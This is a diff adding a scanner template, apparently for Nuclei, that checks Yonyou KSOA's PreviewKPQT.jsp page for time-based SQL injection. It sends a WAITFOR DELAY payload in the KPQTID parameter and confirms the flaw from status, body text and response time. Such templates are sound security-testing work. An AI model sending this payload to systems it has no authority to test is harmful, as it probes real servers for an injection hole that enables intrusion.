@@ -1,0 +1,32 @@
+id: poc-yaml-yongyou-ksoa-previewkpqt-sqli
+info:
+  name: 用友时空KSOA PreviewKPQT SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{to_upper(url_encode('问卷预览'))}}"
+
+http:
+  - raw:
+      - |
+        GET /kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "XXXX-XX-XX"
+          - "{{t3}}"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
